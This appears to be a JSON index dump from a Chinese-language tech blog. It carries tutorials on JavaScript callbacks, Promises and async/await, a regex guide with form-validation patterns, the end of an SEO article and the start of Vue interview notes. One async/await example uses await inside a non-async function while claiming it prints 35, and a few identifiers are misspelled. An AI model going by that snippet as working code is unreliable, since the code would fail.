2022 連結優化指南。\n從今天的指南中，你最想要優先嘗試哪個策略呢？或你對於某件事有疑問。\n不論如何，在底下留言讓我知道。\n","date":"2022-08-17T00:00:00Z","image":"https://live.staticflickr.com/65535/52290179402_693c7086dc_o.jpg","permalink":"https://wayneblog.ga/2022-08-17/seo-backlinks-building-guide/","title":"SEO 反向連結建立：終極指南(2022)"},{"content":" 參考彭彭 - 回呼函式 Callbacks、Promises 物件、Async/Await 非同步流程控制\n前言 Javascript 的主要特點有兩個：\nSingle Thread (單線程) Synchronous (同步) 當主程式中遇到「非同步」的函式如排程、取資料、讀檔\u0026hellip;等相關的函式時(如：setTimeout、fetch\u0026hellip;等)，主程式並不會停止並等待函式執行完成後才繼續往下跑，而是會將其放到 queue 中直到所有程式碼都跑完了，Javascript 會再回頭到 queue 中按順序將 function 拉回來處理。\n1 2 3 4 5 console.log(\u0026#34;程式開始\u0026#34;); setTimeout(() =\u0026gt; { console.log(\u0026#34;非同步事件\u0026#34;); }, 0) console.log(\u0026#34;程式結束\u0026#34;); 程式開始\n程式結束\n非同步事件 \u0026lt;- 最後執行\n上段的原始碼中，setTimeout 所定義的時間為 0，但因為是屬於非同步事件，因此還是會在其他原始碼運行完以後才執行，在 Ajax 的行為中也是一樣，當需要確保擷取到遠端資料才繼續往下執行時，如果程式碼是依序撰寫的方式，就會無法正確呈現資料，以下舉個例子示範。\n舉例 以下為例，此為一個很基本的回傳n1+n2的結果的函式。\n1 2 3 4 5 6 7 8 9 function add(n1, n2) { return n1+n2; } function test() { let result = add(3, 4); console.log(result) } test(); 1 \u0026gt; 7 但若今天需求需要延遲兩秒再將結果打印出來時。\n1 2 3 4 5 6 7 8 9 10 11 function delayedAdd(n1, n2, delayTime) { window.setTimeout(function() { return n1+n2; }, delayTime); } function test() { let result = delayedAdd(3, 4, 2000); console.log(result); } test(); 1 \u0026gt; undefined 此時會發現打印出來的 result 因為 delayedAdd 還未將結果回傳，導致直接顯示 undefined，此時就需要來解決這種非同步流程的控制。\n方法1：Callbacks 回呼函式 最早期使用的方式，於函式最後設定callback，執行需要做的事情。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // Callback 回呼函式 function delayedAdd(n1, n2, delayTime, callback) { // 設定排程，延遲一段時間後執行 window.setTimeout(function() { // 延遲一段時間之後，計算加法，呼叫 callback 函式 callback(n1+n2); }, delayTime); } function test() { delayedAdd(3, 4, 2000, function(result) { console.log(result); }); } test(); 1 \u0026gt; 7 方法2：Promise 物件 近期於ES6提出的新方式。 建立 promise 物件：new Promise(執行函式) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 let p = new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 呼叫resolve將結果回傳 }, delayTime); }); return p; } function test() { let promise = delayedAdd(3, 4, 2000); promise.then(function(result){ console.log(result); }); } test(); 1 \u0026gt; 7 常見寫法，直接 return promise 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 呼叫resolve將結果回傳 }, delayTime); }); } function test() { let promise = delayedAdd(3, 4, 2000); promise.then(function(result){ console.log(result); }); } test(); 1 \u0026gt; 7 new Promise(resolve, reject) 的 resolve 與 reject 為 Promise 原生提供，可自行改名但順序不可異動。 resolve 對應.then()且代表成功，而 reject 則對應到 .catch()且代表失敗。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { reject(n1+n2); // 若使用reject，則需使用.catch }, delayTime); }); } function test() { let promise = delayedAdd(3, 4, 2000); // 因使用 reject 回傳，這裡使用 .catch 來接 promise.catch(function(error){ console.log(error); }); } test(); 1 \u0026gt; 7 方法3：Async/Await ，Promise 的語法糖 Promise的語法糖，以便於更直觀的閱讀與撰寫非同步流程，同 Promise 於ES6提出的新玩意兒。 注意：await 的函式必須要確保有Promise，否則將報錯。 需先宣告為 async 函式，才能使用 await。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 若使用reject，則需使用.catch }, delayTime); }); } // 需先宣告為 async 函式，才可使用 await async function test() { let result = await delayedAdd(3, 4, 2000); console.log(result); } test(); 1 \u0026gt; 7 注意：使用 await 時，主程式會確實停止，等待 await 函式執行完成後，才接續往下跑，舉例： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 若使用reject，則需使用.catch }, delayTime); }); } // 需先宣告為 async 函式，才可使用 await async function test() { let result = await delayedAdd(3, 4, 2000); console.log(result); console.log(\u0026#34;Hello\u0026#34;); } test(); 1 2 \u0026gt; 7 \u0026gt; Hello 延伸一：多個 Promise 的資料處理：Promise.all() 若遇到多個 Promise，且需將各個 Promise 的結果進行運算時，可使用 Promise.all() 來處理。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 呼叫resolve將結果回傳 }, delayTime); }); } function test() { let promise1 = delayedAdd(3, 4, 2000); let promise2 = delayedAdd(2, 3, 3000); // 多個 Promise 都完成之後，將其數值相乘 Promise.all([promise1, promise2]).then(function(results){ // 此時 results 為一個陣列 \u0026gt; [7, 5]; let answer = results.reduce(function(total, value) { return total * value; }) console.log(answer); }); } test(); 1 \u0026gt; 35 延伸二：多個 Promise 使用 Async/Await 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function delayedAdd(n1, n2, delayTime) { // 建立 Promise，使用resolve或reject回傳 return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // 呼叫resolve將結果回傳 }, delayTime); }); } function test() { let result1 = await delayedAdd(3, 4, 2000); let result2 = await delayedAdd(2, 3, 3000); let answer = result1 * result2; console.log(answer); } test(); 1 \u0026gt; 35 ","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52282531224_1f57c841ee_o.jpg","permalink":"https://wayneblog.ga/2022-08-13/js-async-programs/","title":"【Callback、Promise、Async/Await】處理非同步事件"},{"content":" 本文參考網址\n什麼是 async？什麼是 await？ 在 JavaScript 的世界，同步 sync 和非同步 async 的愛恨情仇，就如同偶像劇一般的剪不斷理還亂，特別像是setTimeout、setInterval、MLHttpRequest或fetch這些同步非同步混雜的用法，都會讓人一個頭兩個大，幸好 ES6 出現了 promise，ES7 出現了 async、await，幫助我們可以更容易的進行程式邏輯的撰寫。\n對於同步和非同步，最常見的說法是「同步模式下，每個任務必須按照順序執行，後面的任務必須等待前面的任務執行完成，非同步模式則相反，後面的任務不用等前面的，各自執行各自的任務」，但我覺得這樣實在不容易理解，不容易理解的地方在於「中文」的同步和非同步，可能和實際上的解釋剛好相反了 ( 同步的中文字面意思是「一起走」，非同步的中文意思是「不要一起走」，超容易搞錯的 )，因此如果你跟我一樣也很容易搞錯，可以使用我覺得比較好理解的方法：「同一個步道 vs 不同步道」，透過步道的方式，就更容易明白同步和非同步。\n同步：在「同一個步道」比賽「接力賽跑」，當棒子沒有交給我，我就得等你，不能跑。\n非同步：在「不 ( 非 ) 同步道」比賽「賽跑」，誰都不等誰，只要輪到我跑，我就開始跑。\n在 ES7 裡頭 async 的本質是 promise 的語法糖 ( 包裝得甜甜的比較好吃下肚 )，只要 function 標記為 async，就表示裡頭可以撰寫 await 的同步語法，而 await 顧名思義就是「等待」，它會確保一個 promise 物件都解決 ( resolve ) 或出錯 ( reject ) 後才會進行下一步，當 async function 的內容全都結束後，會返回一個 promise，這表示後方可以使用.then語法來做連接，基本的程式長相就像下面這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 async function a(){ await b(); ..... // 等 b() 完成後才會執行 await c(); ..... // 等 c() 完成後才會執行 await new Promise(resolve=\u0026gt;{ ..... }); ..... // 上方的 promise 完成後才會執行 } a(); a().then(()=\u0026gt;{ ..... // 等 a() 完成後接著執行 }); 利用 async 和 await 做個「漂亮的等待」 比較了解 async 和 await 的意思之後，就來試試看做個「漂亮的等待」，過去有使用 ES6 的 promise 來實現 delay ( 如同下方的程式範例 )，這個 delay 透過.then來完成一步一步的串接，雖然邏輯上很清楚，但若要實作比較複雜的流程，就得把每個程式寫在對應的 callback 裏，也就沒有想像的容易，這就是「不太漂亮的等待」 ( 使用 setTimeout 的做法就是不漂亮的等待 )。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 不漂亮的等待 const delay = (s) =\u0026gt; { return new Promise(resolve =\u0026gt; { setTimeout(resolve,s); }); }; delay().then(() =\u0026gt; { console.log(1); // 顯示 1 return delay(1000); // 延遲ㄧ秒 }).then(() =\u0026gt; { console.log(2); // 顯示 2 return delay(2000); // 延遲二秒 }).then(() =\u0026gt; { console.log(3); // 顯示 3 }); 如果我們把上面的範例修改為 async 和 await 的寫法，突然就發現程式碼看起來非常的乾淨，因為 await 會等待收到 resolve 之後才會進行後面的動作，如果沒有收到就會一直處在等待的狀態，所以什麼時候該等待，什麼時候該做下一步，就會非常清楚明瞭，這也就是我所謂「漂亮的等待」。\n注意，await 一定得運行在 async function 內！\n1 2 3 4 5 6 7 8 9 10 11 12 13 ~async function{ // ~ 開頭表示直接執行這個 function，結尾有 () const delay = (s) =\u0026gt; { return new Promise(function(resolve){ // 回傳一個 promise setTimeout(resolve,s); // 等待多少秒之後 resolve() }); }; console.log(1); // 顯示 1 await delay(1000); // 延遲ㄧ秒 console.log(2); // 顯示 2 await delay(2000); // 延遲二秒 console.log(3); // 顯示 3 }(); 搭配 Promise 基本上只要有 async 和 await 的地方，就一定有 promise 的存在，promise 顧名思義就是「保證執行之後才會做什麼事情」，剛剛使用了 async、await 和 promise 改善setTimeout這個容易出錯的非同步等待，針對setInterval，也能用同樣的做法修改，舉例來說，下面的程式碼執行之後，並「不會」如我們預期的「先顯示 1，再顯示 haha0\u0026hellip;haha5，最後再顯示 2」，而是「先顯示 1 和 2，然後再出現 haha0\u0026hellip;haha5」，因為雖然程式邏輯是從上往下，但在 count function 裏頭是非同步的語法，導致自己走自己的路，也造成了結果的不如預期。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 const count = (t,s) =\u0026gt; { let a = 0; let timer = setInterval(() =\u0026gt; { console.log(`${t}${a}`); a = a + 1; if(a\u0026gt;5){ clearInterval(timer); } },s); }; console.log(1); count(\u0026#39;haha\u0026#39;, 100); console.log(2); 這時我們可以透過 async、await 和 promise 進行修正，在顯示 1 之後，會「等待」count function 結束後再顯示 2。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ~async function(){ const count = (t,s) =\u0026gt; { return new Promise(resolve =\u0026gt; { let a = 0; let timer = setInterval(() =\u0026gt; { console.log(`${t}${a}`); a = a + 1; if(a\u0026gt;5){ clearInterval(timer); resolve(); // 表示完成 } },s); }); }; console.log(1); await count(\u0026#39;haha\u0026#39;, 100); console.log(2); }(); 除了setTimeout和setInterval，這也可以用於像是「輸入文字」的情境，過去我們要做到「連續輸入」文字，可能要層層疊疊寫個好幾個 callback，現在如果使用 async 和 await，就能夠很簡單的實現連續輸入的情境，程式碼看起來也更乾淨簡潔。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // HTML 為一個輸入框、一個按鈕和一個 h1 標籤 // \u0026lt;input id=\u0026#34;a\u0026#34;\u0026gt;\u0026lt;/input\u0026gt;\u0026lt;button id=\u0026#34;b\u0026#34;\u0026gt;send\u0026lt;/button\u0026gt; // \u0026lt;h1 id=\u0026#34;h\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; ~async function(){ const input = () =\u0026gt; { return new Promise(resolve =\u0026gt;{ const btnClick = () =\u0026gt;{ h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, a.value + \u0026#39;\u0026lt;br/\u0026gt;\u0026#39;); // 輸入後在 h1 裡添加內容 a.value = \u0026#39;\u0026#39;; // 清空輸入框 a.focus(); // 將焦點移至輸入框 b.removeEventListener(\u0026#39;click\u0026#39;, btnClick); // removeEventListener 避免重複綁定事件 resolve(); // 完成 }; b.addEventListener(\u0026#39;click\u0026#39;, btnClick); // 綁定按鈕事件 }); }; h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, \u0026#39;開始\u0026lt;br/\u0026gt;\u0026#39;); await input(); // 等待輸入，輸入後才會進行下一步 await input(); await input(); h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, \u0026#39;結束\u0026#39;); }(); 搭配 Fetch 在我之前的文章 JavaScript Fetch API 使用教學 已經有提到fetch的用法，因為fetch最後回傳的是 promise，理所當然的透過 async 和 await 操作是最恰當不過的。\n舉例來說，先前往 中央氣象局開放資料平台 可以取得許多氣象資料，找到 局屬氣象站-現在天氣觀測報告 ，複製 JSON 格式的連結 ( 需要註冊登入才能看得到連結 )，透過fetch的json()方法處理檔案，目標顯示出「高雄市的即時氣溫」。\n透過 async 和 await 的美化程式碼，得到的結果完全不需要 callback 的輔助，就能按照我們所期望的順序進行。(先顯示「開始抓氣象」，接著顯示「高雄市的氣溫」，最後顯示「總算結束了」)\n1 2 3 4 5 6 7 8 9 10 11 12 ~async function(){ console.log(\u0026#39;開始抓氣象\u0026#39;); // 先顯示「開始抓氣象」 await fetch(\u0026#39;氣象局 json 網址\u0026#39;) // 帶有 await 的 fetch .then(res =\u0026gt; { return res.json(); }).then(result =\u0026gt; { let city = result.cwbopendata.location[14].parameter[0].parameterValue; let temp = result.cwbopendata.location[14].weatherElement[3].elementValue.value; console.log(`${city}的氣溫為 ${temp} 度 C`); }); console.log(\u0026#39;總算結束了\u0026#39;); // 抓完氣象之後再顯示「總算結束了」 }(); 搭配 迴圈 如果要透過 JavaScript 實現「文字慢慢變大」的效果，除了透過 CSS 的 transition 設定之外，通常就是直接使用setInterval來完成，就像下面的程式碼這樣：\n1 2 3 4 5 6 7 8 9 let size = 30; h.style.lineHeight = 0; const timer = setInterval(()=\u0026gt;{ h.style.fontSize = size + \u0026#39;px\u0026#39;; size = size + 1; if(size \u0026gt;= 130){ clearInterval(timer); } },10); 如果搭配 async 和 await，我們就能將同樣的做法，改由「迴圈」實現，因為使用了 await，所以迴圈每次執行時，都會進行「等待」，也就能做到字體慢慢變大的效果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML 為一個 h1 標籤 \u0026lt;h1 id=\u0026#34;h\u0026#34;\u0026gt;hello\u0026lt;/h1\u0026gt; ~async function(){ const delay = t =\u0026gt; { // 先撰寫一個等待的 function return new Promise(resolve =\u0026gt; { setTimeout(resolve, t); }); }; h.style.linHeight = 0; for(let i=30; i\u0026lt;130; i++){ h.style.fontSize = i + \u0026#39;px\u0026#39;; await delay(10); // 迴圈每次執行時，都會在這裡等待 10ms } }(); 同樣的，上面提到的 fetch 或是輸入文字，只要做成 await 的方式，都可以放在迴圈裡面使用，例如透過迴圈不斷的 fetch 資料、透過迴圈不斷的輸入文字\u0026hellip;等，這些就不是 callback 方法能容易辦到的囉\n小結 坦白說只要你一但熟悉了 async 和 await，就真的回不去了，雖然說 callback 仍然是程式開發裡必備的功能，但對於同步和非同步之間的轉換，以後就交給 async 和 await 來處理吧！\n","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52281246237_dd06bc8ef9_o.png","permalink":"https://wayneblog.ga/2022-08-13/js-async-await/","title":"Javascript 的 Async/Await"},{"content":" 參考網站\n建立正規式 正則表達式的規則稱作 pattern。在 JavaScript 中可以透過 Regular expression literals 的方式或建構式的方式來建立 regular expressions pattern：\n方法一：Regular expression literals script 載入時即編譯，當 pattern 不會改變時，使用此方式定義 pattern 效能較好。 1 var re = /ab+c/; 方法二：Function Constructor 程式執行過程才會被編譯，效能較差，適合用在 regular expression pattern 可能會改變時使用。 1 2 var re = new RegExp(\u0026#39;ab+c\u0026#39;); var myRe = new RegExp(\u0026#39;d(b+)d\u0026#39;, \u0026#39;g\u0026#39;); Regular expression literals 效能較好，適合 pattern 不會改變的情況；\nFunction Constructor 效能較差，適合用在 pattern 可能動態改變的情況。\n使用正規式 在 JavaScript 中可以使用正規式的函式包含：\nRegExp.prototype.test()：搜尋字串中是否有符合的部分，回傳 true/false。 RegExp.prototype.exec()：以陣列回傳字串中匹配到的部分，否則回傳 null。 String.prototype.match()：以陣列回傳字串中匹配到的部分，否則回傳 null。 String.prototype.replace()：尋找字串中匹配的部分，並取代之。 String.prototype.search()：尋找字串中是否有符合的部分，有的話回傳 index，否則回傳 -1。 String.prototype.split()：在字串根據匹配到的項目拆成陣列。 簡單來說，當你想要看字串是否包含某 pattern 時，使用 test 或 search；\n想要更多的資訊（花較多耗效能），則使用 exec 或 match。\n特殊字元 (character) 標籤（flag） 1 2 3 regex = /hello/; // 區分大小寫，匹配 \u0026#34;hello\u0026#34;, \u0026#34;hello123\u0026#34;, \u0026#34;123hello123\u0026#34;, \u0026#34;123hello\u0026#34;，但不匹配 \u0026#34;hell0\u0026#34;, \u0026#34;Hello\u0026#34; regex = /hello/i; // 不區分大小寫，匹配 \u0026#34;hello\u0026#34;, \u0026#34;HelLo\u0026#34;, \u0026#34;123HelLO\u0026#34; regex = /hello/g; // 全域搜尋 ES 2019 新增 /s 的標籤，過去 . 可以用來匹配除了換行符號以外（\\n, \\r）的所有字元：\n1 2 3 // 過去 . 可以匹配到除了「換行符號」以外的所有字元 console.log(/./.test(\u0026#39;\\n\u0026#39;)); // → false console.log(/./.test(\u0026#39;\\r\u0026#39;)); // → false 過去雖然可以使用 [\\w\\W] 來匹配到換行符號，但這不是最好的做法：\n1 2 console.log(/[\\w\\W]/.test(\u0026#39;\\n\u0026#39;)); // → true console.log(/[\\w\\W]/.test(\u0026#39;\\r\u0026#39;)); // → true 在 ES 2019 中，只要最後有標記 /s 的標籤，如此 . 將也能夠匹配到換行符號：\n1 2 console.log(/./s.test(\u0026#39;\\n\u0026#39;)); // → true console.log(/./s.test(\u0026#39;\\r\u0026#39;)); // → true 普通字元 // 1 2 var regex = /a/; var regex = /is/; 反斜線 \\ 1 2 3 4 5 6 /* 在「非」特殊字元前面使用反斜線時，表示要把反斜線後的字當作是特殊字元 */ var regex = /\\b/; // b 原本不是特殊字元，這個 b 要當成特殊字元 /* 在特殊字元前面使用反斜線時，表示要把反斜線後的字當作是「非」特殊字元 */ var regex = /if\\(true/; // ( 原本是特殊字元，但這裡要當成非特殊字元 var regex = /1\\+2=3/; // + 原本是特殊字元，但這裡要當成非特殊字元 任意一個字元 . 可以用來匹配除了換行符號（\\n）以外的所有字元： 1 2 3 var regex = /a.man/; // a*man 都會 match，例如 \u0026#34;acman\u0026#34;, \u0026#34;awman\u0026#34;, 但 \u0026#34;a\\nman\u0026#34; 無法匹配。 var regex = /.a/; // 任何一個字元後加上 a 多個字元 [] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 小寫 a 或大寫 A var regex = /[aA]/; // 匹配所有不是 a 或 A 的字 var regex = /[^aA]/; // a, e, i, o, u 都會 match var regex = /[aeiou]/; // 英文字母 var regex = /[a-z]/; // 所有小寫的字母，從小寫 a 到小寫 z var regex = /[A-Z]/; // 所有大寫的字母，從大寫 A 到大寫 Z var regex = /[a-zA-Z]/; // 所有英文字母 // 數字 5 ~ 8 var regex = /[5-8]/; 括號 () 套用到所有 1 2 3 var regex = /^a|^the|^an/; // 套用到裡面所有的 var regex = /^(a|the|an)/; // 等同於 不是（除了） ^ 1 2 3 4 5 /* 不是 a 都會 match */ var regex = /[^a]/; /* 不是數字都會 match */ var regex = /[^0-9]/; 多個字元縮寫 keywords：\\d、\\w、\\s、\\b、\\D、\\W、\\S \\d : digit，[0-9] \\w : word，包含英文大小寫、數字、底線，[A-Za-z0-9_] \\s : space，包含 space, tab, form feed, line feed，[\\f\\n\\r\\t\\v\\u00a0\\u1680\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff] \\D : 不是 digit，等同於 [^\\d] \\W : 不是 word，等同於 [^\\w] \\S : 不是 space，等同於 [^\\s] 1 2 3 4 5 6 7 8 9 10 /* 所有 word + e */ var regex = /\\we/; /* 連續兩個任意的數值 */ var regex = /\\d\\d/; /* 句子中結尾為 s 的單字 */ var regex = /s\\b/; var regex = /\\b[a-z]/g; // 句子中各個單字的第一個字母 其他特殊字元： \\t : tab \\b : word boundary，用來比對單字和單字間的空白，/s\\b/ 則會比對句子中最一個字母是 s 的單字 Word boundary \\b、\\B 透過 \\b 可以配對 word boundary，word boundary 指的是一個字元的前後沒有其他任何字元。\n要注意 \\b 和 [\\b] 是不一樣的，[\\b] 是用來配對 backspace。\n1 2 3 // is 這個單字才會被選到，Th`is` 的 is 不會 let matchedResult = \u0026#39;This is an apple.\u0026#39;.match(/\\bis\\b/); // [ \u0026#39;is\u0026#39;, index: 5, input: \u0026#39;This is an apple.\u0026#39; ] 相反地，\\B 則是 non-word boundary：\nBefore the first character of the string, if the first character is not a word character. After the last character of the string, if the last character is not a word character. Between two word characters Between two non-word characters The empty string 1 2 3 4 // 使用 \\B 會配對到 This 中的 is let matchedResult = \u0026#39;This is an apple.\u0026#39;.match(/\\Bis/); // [ \u0026#39;is\u0026#39;, index: 2, input: \u0026#39;This is an apple.\u0026#39; ] 出現次數 * + ? {} {, } keywords： * 、+、?、{次數}、{最少次數, 最多次數} * : 任意次數，等同於{0,} + : 至少一次（後面要跟著），等同於 {1,} ? : 零或一次（有或沒有），等同於 {0,1} {次數} {最少次數, 最多次數} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var regex = /abc/; // 找到符合 \u0026#34;abc\u0026#34; var regex = /ab*c/; // *表示前一個單字可以是 0 個或多個，因此 ac, abc, abbbbc 都符合規則 var regex = /n?a/; // n 可有可無 var regex = /a{2}/; // a 要 2 次，所以會是 a var regex = /a{2,4}/; // a 介於 2 次到 4 次之間 var regex = /a{2,}/; // 2 次以上的 a 都可以，大括號後面不要有空格 var regex = /(hello){4}/; // 4 次的 hello，hellohellohellohello var regex = /\\d{3}/; // 3 次的數字 開頭與結尾 keywords：^、$ ^ 開頭 $ 結尾 1 2 3 4 5 6 7 8 9 10 11 12 /* 以 A 開頭的字才會匹配到 */ /^A/gm.test(\u0026#39;Abc\u0026#39;); // true /^A/gm.test(\u0026#39;bac\u0026#39;); // false /* 開頭有 He */ var regex = /^He/; /* 結尾有 llo */ var regex = /llo$/; /* 開頭 He 結尾 llo 中間任意字元可以有任意次數 */ var regex = /^He.*llo$/; 或 | 1 2 3 4 5 // and 或 android，match 到 `and`roid 就不 match `android` var regex = /and|android/; // match 到 android 還是會 match and var regex = /android|and/; LookAround Assertions keywords: x(?=y)、x(?!y) Lookahead assertions: x(?=y)、x(?!y) Lookbehind assertions: (?\u0026lt;=y)x、(?\u0026lt;!y)x Look Ahead ?=：後面需要跟著 ?!：後面不能跟著 1 2 3 4 5 6 7 8 9 10 11 12 // foo(?=bar)，foo 後面要跟著 bar 才會配對到 foo const regexp = /foo(?=bar)/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foobar\u0026#39;, groups: undefined ] // foo(?!bar)，foo 後面不能跟著 bar，如此才會配對到 foo const regexp = /foo(?!bar)/; regexp.exec(\u0026#39;foo\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foo\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;foo123\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foo123\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // null Look Behind ?\u0026lt;=：前面需要跟著才會匹配到 ?\u0026lt;!：前面不能跟著才會匹配到 1 2 3 4 5 6 7 8 9 10 11 12 // (?\u0026lt;=foo)bar，當 bar 前面有 foo 時才會配對到 bar const regexp = /(?\u0026lt;=foo)bar/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 3, input: \u0026#39;foobar\u0026#39;, groups: undefined ] // (?\u0026lt;!foo)bar，當 bar 前面沒有 foo 時才會配對到 bar const regexp = /(?\u0026lt;!foo)bar/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 0, input: \u0026#39;bar\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;123bar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 3, input: \u0026#39;123bar\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;foobar\u0026#39;); // null ❗❗❗ Lookbehind assertions 屬於 ES2018 的語法，須注意相容性。 ❗❗❗\n貪婪模式（Greedy Mode） 預設會啟用貪婪模式，如果想要關閉貪婪模式，也就是讓到一匹配到就停止，可以使用在 * 、 + 等後面加上 ?，例如 .*?、.+?。\npattern 筆記 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 export default { // 允許數字、英文字 // 長度4~12 account: /^[0-9A-Za-z]{4,12}$/, // 需包含數字、英文字、英文特殊符號 // 但不得包含符號 \\ // 長度1~24 password: /^(?=.*\\d)(?=.*[a-zA-Z])[a-zA-Z0-9!@#$%^\u0026amp;*()_+{}:\u0026#34;|\u0026lt;\u0026gt;?\\-=\\[\\]\u0026#39;\\;,./~`]{1,24}$/, // 允許數字、英文字、中文字 // 長度2~8 nickName: /^[0-9A-Za-z\\u4E00-\\u9FFF]{2,8}$/, // 允許數字、英文字、中文字、英文特殊符號、空白，但開頭不得為特殊符號或空白 realName: /^(?!(-))(?!(\\s))(?!(,))[A-Za-z\\-\\,\\s\\u4E00-\\u9FFF]{0,20}[^(?=(!@#$%^\u0026amp;*()_+{}:\u0026#34;|\u0026lt;\u0026gt;?\\-=\\[\\]\u0026#39;\\;,./~\\s\\d`)))]$/, // 信箱 createEmail: /^([\\w])([\\-\\._]?[\\w]){0,64}\\@([\\w])([\\-\\._]?[\\w]){0,64}\\.([a-zA-Z]){2,6}$/, // 前三碼英文字、後三碼數字 promotionCode: /^[A-Za-z]{3}[0-9]{3}$/, // 允許數字、英文字、中文字、英文特殊符號、中文特殊符號、空白 // 長度0~100 remark: /^[0-9A-Za-z-_\\u4E00-\\u9FA5+/.*!@#$%\u0026amp;?()=|\u0026#39;:;\u0026lt;\u0026gt;,~！@#￥……\u0026amp;*（）——|{}【】‘；：”“\u0026#39;。，、？%\\s]{0,100}$/, } ","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52282544509_9802b00af7_o.png","permalink":"https://wayneblog.ga/2022-08-13/js-regex/","title":"Javascript 的正則表達式(Regular Expression, regex)"},{"content":" 參考網站\n基礎篇 1. 對 SPA 單頁⾯的理解，優缺點是什麼？ SPA（ single-page application ）僅在 Web 頁⾯初始化時加載相應的 HTML、JavaScript 和 CSS。 ⼀旦頁⾯加載完成，SPA 不會因為⽤戶的操作⽽進⾏⻚⾯的重新加載或跳轉；取⽽代之的是利⽤路由機制實現 HTML 內容的變換，UI 與⽤戶的交互，避免頁⾯的重新加載。 優點： ⽤戶體驗好、快，內容的改變不需要重新加載整個頁⾯，避免了不必要的跳轉和重複渲染 SPA 相對對服務器壓⼒⼩ 前後端職責分離，架構清晰，前端進⾏交互邏輯，後端負責數據處理 缺點： ⾸屏（初次）加載慢：為實現單⻚ Web 應⽤功能及顯示效果，需要在加載⻚⾯的時候將JavaScript、CSS 統⼀加載，部分⻚⾯按需加載 不利於 SEO：由於所有的內容都在⼀個⻚⾯中動態替換顯示，所以在 SEO 上其有著天然的弱勢 2. new Vue() 發生了什麼？ 結論：new Vue()是創建Vue實例，它內部執行了根實例的初始化過程 具體包括以下操作： 選項合併，children, refs, slot, createElement等实例属性的方法初始化 自定義事件處理 數據響應式處理 生命週期鉤子調用 (beforecreate created) 可能的掛載 總結：new Vue()創建了根實例並準備好數據和方法，未來執行掛載時，此過程還會遞歸的應用於它的子組件上，最終形成一個有緊密關係的組件實例樹 3. Vue.use是幹什麼的？原理是什麼？ vue.use 是用來使用插件的，我們可以在插件中擴展全局組件、指令、原型方法等。 檢查插件是否註冊，若已註冊，則直接跳出 處理入參，將第一個參數之後的參數歸集，並在首部塞入 this 上下文 執行註冊方法，調用定義好的 install 方法，傳入處理的參數，若沒有 install 方法並且插件本身為 function 則直接進行註冊 插件不能重複的加載，install 方法的第一個參數是vue的構造函數，其他參數是Vue.set中除了第一個參數的其他參數； 代碼：args.unshift(this) 調用插件的install 方法 代碼：typeof plugin.install === \u0026ldquo;function\u0026rdquo; 插件本身是一個函數，直接讓函數執行。代碼：plugin.apply(null, args) 緩存插件。代碼：installedPlugins.push(plugin) 4. 請說一下響應式數據的理解？ 根據數據類型來做不同處理，數組和對像類型當值變化時如何劫持。 對象內部通過defineReactive方法，使用 Object.defineProperty() 監聽數據屬性的 get 來進行數據依賴收集，再通過 set 來完成數據更新的派發 